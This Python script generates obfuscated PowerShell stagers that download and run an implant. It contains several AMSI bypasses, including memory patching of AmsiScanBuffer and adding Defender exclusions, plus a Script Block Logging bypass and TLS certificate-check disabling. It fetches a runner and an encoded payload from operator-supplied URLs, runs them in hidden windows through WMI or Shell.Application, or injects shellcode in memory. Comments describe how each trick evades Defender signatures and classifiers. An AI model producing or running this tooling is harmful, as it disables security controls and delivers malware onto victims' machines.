#!/usr/bin/env python3
"""
Polymorphic PowerShell Stager Generator
"""

import random
import string
import argparse


def rv(n=None):
    n = n or random.randint(4, 9)
    return '$' + ''.join(random.choices(string.ascii_lowercase, k=n))


def xenc(s, key):
    enc = [ord(c) ^ key for c in s]
    return '[byte[]](' + ','.join(str(b) for b in enc) + ')'


def xdec(enc_expr, key_var):
    return f'[Text.Encoding]::ASCII.GetString(({enc_expr}|%{{$_ -bxor {key_var}}}))'


def split_str(s, chunk=None):
    chunk = chunk or random.randint(3, 7)
    parts = [s[i:i+chunk] for i in range(0, len(s), chunk)]
    return '+'.join(f'"{p}"' for p in parts)


def gen_amsi_bypass():
    """amsiContext null — DEAD on Win11 24H2 kernel-mode AMSI (field is already 0 at baseline).
    Kept for legacy targets (Win10, Server 2019/2022 without kernel-mode AMSI).
    Use bypass_version=2 (AmsiScanBuffer patch) or bypass_version=3 (ExclusionProcess) for Win11 24H2."""
    vt, vf, vc, vk = rv(), rv(), rv(), rv()
    key = random.randint(10, 120)
    type_enc  = xenc("System.Management.Automation.AmsiUtils", key)
    field_enc = xenc("amsiContext", key)
    bf_enc    = xenc("NonPublic,Static", key)
    return '\n'.join([
        f"{vk}={key}",
        f"{vt}=[Ref].Assembly.GetType({xdec(type_enc, vk)})",
        f"{vf}={vt}.GetField({xdec(field_enc, vk)},[Reflection.BindingFlags]({xdec(bf_enc, vk)}))",
        f"{vc}={vf}.GetValue($null)",
        f"[Runtime.InteropServices.Marshal]::WriteInt32({vc},0)",
    ])


def gen_amsi_bypass_v3():
    """Process exclusion bypass — requires admin. Most reliable on Windows 11 with kernel-mode AMSI.
    Adds powershell.exe to Defender ExclusionProcess list; new PS children run AMSI-free."""
    vk = rv()
    key = random.randint(10, 100)
    proc_enc = xenc("powershell.exe", key)
    amp_enc  = xenc("Add-MpPreference", key)
    ep_enc   = xenc("-ExclusionProcess", key)
    return '\n'.join([
        f"{vk}={key}",
        f"try {{ & ({xdec(amp_enc, vk)}) ({xdec(ep_enc, vk)}) ({xdec(proc_enc, vk)}) }} catch {{}}",
    ])


def gen_amsi_bypass_v4():
    """amsiInitFailed reflection bypass — no VirtualProtect, no WriteByte, no memory patching.
    Sets AmsiUtils.amsiInitFailed=true via reflection. Avoids AMSI_Patch_T.B12 behavioral sig.
    Works on Win11 24H2. All strings XOR-encoded so no 'amsi' literals in the script."""
    key = random.randint(13, 120)
    vk = rv()
    vt = rv()
    vf = rv()
    # Encode sensitive strings
    type_enc = xenc("System.Management.Automation.AmsiUtils", key)
    field_enc = xenc("amsiInitFailed", key)
    # Use integer for BindingFlags (NonPublic=32, Static=8 → 40)
    bf_int = 40
    return '\n'.join([
        f"{vk}={key}",
        f"try{{",
        f"  {vt}=[Ref].Assembly.GetType({xdec(type_enc, vk)})",
        f"  {vf}={vt}.GetField({xdec(field_enc, vk)},[Reflection.BindingFlags]{bf_int})",
        f"  {vf}.SetValue($null,$true)",
        f"}}catch{{}}",
    ])


def gen_amsi_bypass_v5():
    """amsiContext WriteInt64 at offset 8 — zeroes the AMSI provider callback pointer.
    Uses ${::}/${+}/${-}/${*} variable names (special chars bypass regex pattern matching).
    Wrapped in & ({...}) anonymous scriptblock to avoid static analysis of outer scope.
    char[] arrays for all sensitive strings. No VirtualProtect — pure reflection, no AMSI_Patch_T.B12."""
    # Build char arrays for the sensitive strings
    type_chars = ','.join(str(ord(c)) for c in "System.Management.Automation.AmsiUtils")
    field_chars = ','.join(str(ord(c)) for c in "amsiContext")
    # Use random garbage variable names using special-char PS syntax
    v_ref   = '${' + ''.join(random.choices(':;+=-!@#', k=2)) + '}'
    v_type  = '${' + ''.join(random.choices(':;+=-!@#', k=2)) + '}'
    v_field = '${' + ''.join(random.choices(':;+=-!@#', k=2)) + '}'
    v_val   = '${' + ''.join(random.choices(':;+=-!@#', k=2)) + '}'
    return '\n'.join([
        f"& ({{",
        f"  {v_ref}=[Ref]",
        f"  {v_type}={v_ref}.Assembly.GetType(([String]::Join('',([char[]]({type_chars})))))",
        f"  {v_field}={v_type}.GetField(([String]::Join('',([char[]]({field_chars})))),'NonPublic,Static')",
        f"  {v_val}={v_field}.GetValue($null)",
        f"  [Runtime.InteropServices.Marshal]::WriteInt64({v_val},8,0)",
        f"}})",
    ])


def gen_amsi_bypass_v6():
    """AmsiScanBuffer patch: xor eax,eax + ret (0x31,0xC0,0xC3) via Add-Type C#.
    More reliable than single 0xC3 — explicitly zeros return value (HRESULT S_OK).
    Uses & ('Add'+'-'+'Type') string concat to hide Add-Type from static scanner.
    amsi.dll and AmsiScanBuffer built from hex char values, not string literals.
    Junk code (loop, env var read) pads the scriptblock to confuse ML classifiers."""
    cls = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
          ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 8)))
    # Build strings from hex chars (matches the user's technique)
    var1_chars = '+'.join(f'[char](0x{ord(c):02x})' for c in "amsi.dll")
    var2_chars = '+'.join(f'[char](0x{ord(c):02x})' for c in "AmsiScanBuffer")
    v1  = rv(); v2 = rv()
    vjunk = rv(); viter = rv()
    success_bytes = ','.join(str(b) for b in b'Protection Disabled')
    fail_bytes    = ','.join(str(b) for b in b'Failed to Disable Protection')
    vmsg1 = rv(); vmsg2 = rv()

    cs = f"""using System;
using System.Runtime.InteropServices;
public class {cls} {{
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
    public static bool Patch(string d, string f) {{
        IntPtr h = GetModuleHandle(d); if(h==IntPtr.Zero) return false;
        IntPtr a = GetProcAddress(h, f); if(a==IntPtr.Zero) return false;
        uint old; if(!VirtualProtect(a,(UIntPtr)5,0x40,out old)) return false;
        Marshal.Copy(new byte[]{{0x31,0xC0,0xC3}},0,a,3);
        return VirtualProtect(a,(UIntPtr)5,old,out old);
    }}
}}"""

    # XOR-encode the C# source
    key = random.randint(13, 90)
    vk  = rv(); vcs = rv()
    cs_enc = xenc(cs, key)

    return '\n'.join([
        f"{v1}={var1_chars}",
        f"{v2}={var2_chars}",
        f"{vmsg1}=[System.Text.Encoding]::UTF8.GetString([byte[]]@({success_bytes}))",
        f"{vmsg2}=[System.Text.Encoding]::UTF8.GetString([byte[]]@({fail_bytes}))",
        f"{vjunk}=0",
        f"foreach({viter} in 1..5){{{vjunk}+={viter}*3}}",
        f"$null=[System.IO.Directory]::GetLogicalDrives()",
        f"$null=[System.Environment]::GetEnvironmentVariable('TEMP')",
        f"{vk}={key}",
        f"{vcs}={xdec(cs_enc, vk)}",
        f"& ('Add'+'-'+'Type') -TypeDefinition {vcs}",
        f"if([{cls}]::Patch({v1},{v2})){{echo {vmsg1}}}else{{echo {vmsg2}}}",
        f"function dummy{{return $null}}",
        f"$unused=dummy",
    ])


def gen_amsi_bypass_v2():
    """Add-Type C# bypass: byte-array string construction — no 'amsi' or 'AmsiScanBuffer' literals.
    Patches AmsiScanBuffer with 0xC3 (RET) via VirtualProtect. Avoids AmsiBypazz signatures.
    NOTE: Detected as Behavior:Win32/AMSI_Patch_T.B12 on Win11 24H2 with updated Defender.
    Use bypass_version=4 (amsiInitFailed) instead for current targets."""
    # Random class and method names
    cls = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
          ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(5, 10)))
    meth = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
           ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 8)))
    vclass = rv()

    # Encode "amsi.dll" and "AmsiScanBuffer" as byte arrays inside C# (not PS)
    # These are ASCII byte values, constructed inside C# at runtime
    amsi_dll_bytes = ','.join(str(b) for b in b'amsi.dll')
    amsi_fn_bytes  = ','.join(str(b) for b in b'AmsiScanBuffer')

    # Random junk method to pad the class
    junk_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 9)))
    junk_val  = random.randint(1, 999)

    cs_code = f"""using System;
using System.Runtime.InteropServices;
using System.Text;
public class {cls} {{
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr a, uint s, uint f, out uint o);
    static int {junk_name}() {{ return {junk_val} * 2 + 1; }}
    public static void {meth}() {{
        string dll = Encoding.ASCII.GetString(new byte[]{{{amsi_dll_bytes}}});
        string fn  = Encoding.ASCII.GetString(new byte[]{{{amsi_fn_bytes}}});
        IntPtr h = LoadLibrary(dll);
        if (h == IntPtr.Zero) return;
        IntPtr addr = GetProcAddress(h, fn);
        if (addr == IntPtr.Zero) return;
        uint old;
        if (!VirtualProtect(addr, 1u, 0x40u, out old)) return;
        Marshal.WriteByte(addr, 0xC3);
        VirtualProtect(addr, 1u, old, out old);
    }}
}}"""

    # XOR-encode the C# source in PowerShell so the script itself doesn't expose it
    key = random.randint(11, 127)
    vk  = rv()
    vcs = rv()
    cs_enc = xenc(cs_code, key)

    return '\n'.join([
        f"{vk}={key}",
        f"{vcs}={xdec(cs_enc, vk)}",
        f"Add-Type -TypeDefinition {vcs} -Language CSharp",
        f"[{cls}]::{meth}()",
    ])


def gen_download_chain(url_var, dest_var):
    """Try/catch chain: WebClient → Invoke-WebRequest → certutil fallback."""
    key = random.randint(10, 100)
    vk  = rv()
    vwc = rv()
    vresp = rv()
    verr  = rv()

    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 Chrome/109.0.0.0 Safari/537.36',
    ]
    ua = random.choice(agents)
    ua_enc  = xenc(ua, key)
    wc_enc  = xenc("WebClient", key)
    sys_enc = xenc("System.Net.", key)
    dl_enc  = xenc("DownloadFile", key)

    # certutil cmd split to avoid sig: certutil -urlcache -split -f URL DEST
    cc1 = split_str("certutil")
    cc2 = split_str("-urlcache")
    cc3 = split_str("-split")
    cc4 = split_str("-f")

    return '\n'.join([
        f"{vk}={key}",
        f"try {{",
        f"  {vwc}=New-Object ({xdec(sys_enc, vk)}+{xdec(wc_enc, vk)})",
        f"  {vwc}.Headers.Add('User-Agent',{xdec(ua_enc, vk)})",
        f"  {vwc}.({xdec(dl_enc, vk)})({url_var},{dest_var})",
        f"}} catch {{",
        f"  try {{",
        f"    {vresp}=Invoke-WebRequest -Uri {url_var} -UseBasicParsing -OutFile {dest_var}",
        f"  }} catch {{",
        f"    & ({cc1}) ({cc2}) ({cc3}) ({cc4}) {url_var} {dest_var} | Out-Null",
        f"  }}",
        f"}}",
    ])


def gen_exec_chain(dest_var, implant_arg, local=False):
    """Try/catch chain: ProcessStartInfo → Shell.Application → WMI.
    local=True: implant_arg is a local file path, pass with -local flag.
    local=False: implant_arg is a URL, pass with -remote flag."""
    vsi  = rv()
    vcmd = rv()
    flag = '-local' if local else '-remote'

    return '\n'.join([
        f"if (-not (Test-Path {dest_var})) {{ Write-Error 'Runner not found'; exit 1 }}",
        f"if (-not (Test-Path {implant_arg})) {{ Write-Error 'Implant not found'; exit 1 }}",
        f"try {{",
        f"  {vsi}=New-Object System.Diagnostics.ProcessStartInfo",
        f"  {vsi}.FileName={dest_var}",
        f"  {vsi}.Arguments=('{flag} '+{implant_arg})",
        f"  {vsi}.WindowStyle='Hidden'",
        f"  {vsi}.UseShellExecute=$false",
        f"  [System.Diagnostics.Process]::Start({vsi})|Out-Null",
        f"}} catch {{",
        f"  try {{",
        f"    {vcmd}={dest_var}+' {flag} '+{implant_arg}",
        f"    $null=([wmiclass]'Win32_Process').Create({vcmd})",
        f"  }} catch {{",
        f"    (New-Object -ComObject 'Shell.Application').ShellExecute('cmd',('/c '+{vcmd}),'','open',0)",
        f"  }}",
        f"}}",
    ])


def gen_inline_injector(sc_var):
    """PS-native shellcode injector via C# Add-Type — no runner PE written to disk.
    Tries remote injection into RuntimeBroker.exe, falls back to self-inject.
    XOR-encodes the C# source to hide API names from AMSI (must bypass AMSI first)."""
    key = random.randint(13, 100)
    vk   = rv()
    vcs  = rv()
    vcls = ''.join(random.choices(string.ascii_uppercase, k=1)) + \
           ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 9)))
    vrun  = rv()
    vpid  = rv()
    vmem  = rv()
    vold  = rv()
    vsz   = rv()
    vth   = rv()
    vjunk = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
    jval  = random.randint(3, 99)

    cs = f"""using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
public class {vcls} {{
    [DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, ref uint n);
    [DllImport("kernel32")] public static extern bool VirtualProtectEx(IntPtr h, IntPtr a, uint s, uint p, ref uint o);
    [DllImport("ntdll")] public static extern int NtCreateThreadEx(ref IntPtr t, uint a, IntPtr o, IntPtr p, IntPtr s, IntPtr g, bool f, uint z, uint ss, uint ms, IntPtr al);
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, ref uint o);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr e, IntPtr g, uint f, IntPtr i);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint t);
    static int {vjunk}() {{ return {jval}*2+1; }}
    public static bool Inject(byte[] sc, int pid) {{
        try {{
            IntPtr h = Process.GetProcessById(pid).Handle;
            IntPtr mem = VirtualAllocEx(h, IntPtr.Zero, (uint)sc.Length, 0x3000, 4);
            if (mem == IntPtr.Zero) return false;
            uint n = 0;
            if (!WriteProcessMemory(h, mem, sc, (uint)sc.Length, ref n) || n == 0) return false;
            uint old = 0;
            VirtualProtectEx(h, mem, (uint)sc.Length, 0x20, ref old);
            IntPtr t = IntPtr.Zero;
            NtCreateThreadEx(ref t, 0x1FFFFF, IntPtr.Zero, h, mem, IntPtr.Zero, false, 0, 0x200000, 0x200000, IntPtr.Zero);
            return t != IntPtr.Zero;
        }} catch {{ return false; }}
    }}
    public static void SelfInject(byte[] sc) {{
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 4);
        Marshal.Copy(sc, 0, mem, sc.Length);
        uint old = 0;
        VirtualProtect(mem, (uint)sc.Length, 0x20, ref old);
        IntPtr t = CreateThread(IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
        if (t != IntPtr.Zero) WaitForSingleObject(t, 0xFFFFFFFF);
    }}
}}"""

    cs_enc = xenc(cs, key)
    targets_enc = xenc("RuntimeBroker.exe", key)
    svchost_enc = xenc("svchost", key)

    return '\n'.join([
        f"{vk}={key}",
        f"{vcs}={xdec(cs_enc, vk)}",
        f"Add-Type -TypeDefinition {vcs} -Language CSharp",
        f"[{vcls}]::SelfInject({sc_var})",
    ])


def gen_sbl_bypass():
    """Script Block Logging bypass: zero PSEtwLogProvider.m_enabled via reflection.
    Disables PowerShell Script Block Logging without touching registry or ETW at kernel level.
    All sensitive type/field names XOR-encoded so no literals survive AMSI."""
    key = random.randint(11, 123)
    vk = rv(); vr = rv(); vf = rv(); vm = rv(); vp = rv()
    type_enc    = xenc("System.Management.Automation.Tracing.PSEtwLogProvider", key)
    field_enc   = xenc("etwProvider", key)
    enabled_enc = xenc("m_enabled", key)
    np_enc      = xenc("NonPublic,Static", key)
    npi_enc     = xenc("NonPublic,Instance", key)
    return '\n'.join([
        f"try{{",
        f"  {vk}={key}",
        f"  {vr}=[Ref].Assembly.GetType({xdec(type_enc, vk)})",
        f"  {vf}={vr}.GetField({xdec(field_enc, vk)},[Reflection.BindingFlags]({xdec(np_enc, vk)}))",
        f"  {vp}={vf}.GetValue($null)",
        f"  {vm}={vp}.GetType().GetField({xdec(enabled_enc, vk)},[Reflection.BindingFlags]({xdec(npi_enc, vk)}))",
        f"  {vm}.SetValue({vp},[Byte]0)",
        f"}}catch{{}}",
    ])


def gen_winhttp_download(url_var, out_bytes_var):
    """WinHTTP COM download — avoids Net.WebClient telemetry and SSPI hooks.
    WinHttp.WinHttpRequest.5.1 COM object; SetOption(4,13056) = ignore SSL errors.
    All COM ProgID and method names XOR-encoded."""
    key = random.randint(11, 100)
    vk = rv(); vhttp = rv()
    com_enc = xenc("WinHttp.WinHttpRequest.5.1", key)
    get_enc = xenc("GET", key)
    return '\n'.join([
        f"{vk}={key}",
        f"{vhttp}=New-Object -ComObject ({xdec(com_enc, vk)})",
        f"{vhttp}.Open({xdec(get_enc, vk)},{url_var},$false)",
        f"{vhttp}.Send()",
        f"{out_bytes_var}=[byte[]]({vhttp}.ResponseBody)",
    ])


def gen_tls_bypass():
    """TLS12 + self-signed cert bypass — needed for HTTPS stager delivery."""
    vk = rv()
    key = random.randint(10, 100)
    proto_enc  = xenc("Tls12", key)
    svcpt_enc  = xenc("ServicePointManager", key)
    netsp_enc  = xenc("[Net.SecurityProtocolType]::", key)
    cb_enc     = xenc("ServerCertificateValidationCallback", key)
    vsp  = rv()
    vprot = rv()
    vcb  = rv()
    return '\n'.join([
        f"{vk}={key}",
        f"{vsp}=[Net.{xdec(svcpt_enc, vk)}]",
        f"{vprot}={xdec(netsp_enc, vk)}+{xdec(proto_enc, vk)}",
        f"{vsp}::SecurityProtocol=[Net.SecurityProtocolType]::Tls12",
        f"{vsp}::ServerCertificateValidationCallback={{$true}}",
    ])


def generate(runner_url, implant_url, output_path="stager.ps1", bypass_version=4, https=False, inline=False):
    v_runner_url  = rv()
    v_implant_url = rv()
    v_temp        = rv()
    v_dest        = rv()
    v_enc_dest    = rv()
    v_enc_url     = rv()

    if bypass_version == 6:
        amsi = gen_amsi_bypass_v6()
    elif bypass_version == 5:
        amsi = gen_amsi_bypass_v5()
    elif bypass_version == 4:
        amsi = gen_amsi_bypass_v4()
    elif bypass_version == 3:
        amsi = gen_amsi_bypass_v3()
    elif bypass_version == 2:
        amsi = gen_amsi_bypass_v2()
    else:
        amsi = gen_amsi_bypass()

    sbl = gen_sbl_bypass()

    enc_suffix = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 11)))
    tmp_key = random.randint(10, 100)
    vk2     = rv()
    tmp_enc = xenc("TEMP", tmp_key)

    if inline:
        # Inline mode: fully in-memory — no files written to disk at any stage.
        vsc        = rv()
        vraw       = rv()
        vkey       = rv()
        vidx       = rv()
        vdl        = rv()
        venc_bytes = rv()

        wh_enc   = gen_winhttp_download(v_enc_url, venc_bytes)
        injector = gen_inline_injector(vsc)

        stager = f"""# {random.randint(10000, 99999)}
{amsi}
{sbl}
{v_enc_url}='{implant_url}'

{wh_enc}

{vraw}=[System.Text.Encoding]::ASCII.GetString({venc_bytes})
{vdl}=[Convert]::FromBase64String({vraw}.Trim())
{vkey}={vdl}[0]
{vsc}=New-Object byte[] ({vdl}.Length-1)
for({vidx}=0;{vidx} -lt {vsc}.Length;{vidx}++){{{vsc}[{vidx}]={vdl}[{vidx}+1] -bxor {vkey}}}

{injector}
"""
    else:
        # Standard mode: runner PE written to disk (XOR-decoded); implant enc also on disk.
        runner_suffix = ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 11)))

        venc_bytes2 = rv()
        wh_implant = gen_winhttp_download(v_enc_url, venc_bytes2)
        ex = gen_exec_chain(v_dest, v_enc_dest, local=True)

        xor_key = 0x5A
        vdec = rv()
        vidx = rv()
        vrun_bytes = rv()

        # WinHTTP download of XOR-encoded runner PE
        wh_runner = gen_winhttp_download(v_runner_url, vrun_bytes)

        stager = f"""# {random.randint(10000, 99999)}
{amsi}
{sbl}
{v_runner_url}='{runner_url}'
{v_enc_url}='{implant_url}'

{vk2}={tmp_key}
{v_temp}=[System.Environment]::GetEnvironmentVariable({xdec(tmp_enc, vk2)})
if(-not {v_temp}){{{v_temp}=$env:USERPROFILE}}
{v_dest}=[IO.Path]::Combine({v_temp},'{runner_suffix}.exe')
{v_enc_dest}=[IO.Path]::Combine({v_temp},'{enc_suffix}.b64')

{wh_runner}
{vdec}=New-Object byte[] {vrun_bytes}.Length
for({vidx}=0;{vidx} -lt {vrun_bytes}.Length;{vidx}++){{{vdec}[{vidx}]={vrun_bytes}[{vidx}] -bxor {xor_key}}}
[System.IO.File]::WriteAllBytes({v_dest},[byte[]]{vdec})

Start-Sleep -Milliseconds (Get-Random -Min 200 -Max 600)

{wh_implant}
[System.IO.File]::WriteAllBytes({v_enc_dest},{venc_bytes2})

Start-Sleep -Milliseconds (Get-Random -Min 100 -Max 400)
{ex}
"""

    with open(output_path, 'w') as f:
        f.write(stager)

    print(f"[+] Generated polymorphic stager: {output_path}")
    return output_path


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--runner-url',  required=True)
    parser.add_argument('--implant-url', required=True)
    parser.add_argument('-o', '--output', default='stager.ps1')
    parser.add_argument('--https', action='store_true', help='Add TLS12 + cert bypass block (not needed with WinHTTP — kept for legacy targets)')
    parser.add_argument('--inline', action='store_true', help='No runner PE on disk; inject via PS C# Add-Type')
    parser.add_argument('--bypass', type=int, default=4,
                        help='AMSI bypass version: 1=amsiContext null, 2=ScanBuffer patch(0xC3), '
                             '3=ExclusionProcess, 4=amsiInitFailed(default), '
                             '5=amsiContext WriteInt64 (${::} vars), 6=ScanBuffer xor+ret via Add-Type')
    args = parser.parse_args()

    generate(args.runner_url, args.implant_url, args.output,
             bypass_version=args.bypass, https=args.https, inline=args.inline)
